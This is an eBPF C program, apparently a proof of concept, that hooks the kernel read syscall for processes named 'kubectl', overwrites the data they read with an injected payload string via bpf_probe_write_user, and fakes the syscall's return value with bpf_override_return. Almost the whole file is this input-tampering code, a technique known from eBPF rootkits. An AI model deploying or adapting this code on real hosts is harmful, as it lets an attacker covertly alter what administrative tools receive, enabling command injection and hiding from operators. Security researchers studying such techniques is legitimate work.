#define __x86_64__
//#include <bpf/bpf.h>
#include "my.h"
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>

#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define TASK_COMM_LEN          24

int my_memcmp(const void *buffer1,const void *buffer2,int count)

{

   if (!count)

      return(0);

   while ( --count && *(char *)buffer1 == *(char *)buffer2)

   {

      buffer1 = (char *)buffer1 + 1;

        buffer2 = (char *)buffer2 + 1;

   }

   return( *((unsigned char *)buffer1) - *((unsigned char *)buffer2) );

}

struct bpf_map_def SEC("maps") comm = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(struct procName),
    .value_size = sizeof(int),
    .max_entries = 100,
    .map_flags = BPF_F_NO_PREALLOC,
};

struct bpf_map_def SEC("maps") written = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(int),
    .value_size = sizeof(int),
    .max_entries = 100,
    .map_flags = BPF_F_NO_PREALLOC,
};

SEC("kprobe/__x64_sys_read")
int kprobe_sys_read(struct pt_regs *ctx)
{
    struct procName pn;
    bpf_get_current_comm(&pn.name, sizeof(pn.name));

    char TARGET_NAME[]="sshd";
    if (!my_memcmp(pn.name, TARGET_NAME, sizeof(TARGET_NAME)))
        return 0;
    char TARGET_NAME1[]="kubectl";
    // strcpy(TARGET_NAME,"cat");
    if (my_memcmp(pn.name, TARGET_NAME1, sizeof(TARGET_NAME1)))
        return 0;
    
    int *i = bpf_map_lookup_elem(&comm, &pn);
    if (!i){
        bpf_printk("skip %s\n", pn.name);
        return 0;
    }

    

    int pid = bpf_get_current_pid_tgid() >> 32;
    int *my_written = bpf_map_lookup_elem(&written, &pid);

    bpf_printk("Hello, world, from BPF! My PID is %d\n", pid);

    struct pt_regs * __ctx = (struct pt_regs *)PT_REGS_PARM1_CORE(ctx);
    if (!__ctx) {
         bpf_printk("failed to load original ctx");
         return 0;
    }
//    const char *read_buf; bpf_probe_read(&read_buf, sizeof(read_buf), &__ctx->si);
    void *read_buf= (void *)PT_REGS_PARM2_CORE(__ctx);

    if (!read_buf){
         bpf_printk("read buf is null");
         return 0;
    }
    bpf_printk("read buf is %p",read_buf);

    int fd_id= (int)PT_REGS_PARM1_CORE(__ctx);
    bpf_printk("read user fd:%d\n", fd_id);
   
    // only works in kretprobe
    // int original_ret= PT_REGS_RC_CORE(ctx);
    // bpf_printk("ioriginal_re ts %d\n", original_ret);

    char readed[7];
    int ret = bpf_probe_read_user(readed, sizeof(readed), read_buf);
    if (ret !=0 ){
        bpf_printk("failed to read user:%d\n", ret) ;
    }
    bpf_printk("readed is %s\n", readed); 

    if (read_buf == 0)
        return 0;
    if (my_written && *my_written == 1) 
    {
        bpf_printk("return 0\n") ;
        int w = 0;
        bpf_map_update_elem(&written, &pid, &w, BPF_ANY);
        bpf_override_return(ctx, 0);
        read_buf = 0;
        return 0;
    }

    char payload[]="dd";
    ret = bpf_probe_write_user(read_buf, payload, sizeof(payload));
    if (ret != 0){
        bpf_printk("failed to write user:%d\n", ret) ;
    }
    bpf_printk("write user data\n") ;
    bpf_override_return(ctx, sizeof(payload));
    int w = 1;
    bpf_map_update_elem(&written, &pid, &w, BPF_ANY);
    read_buf = 0;
    return 0;
}

char __license[] __attribute__((section("license"), used)) = "GPL";
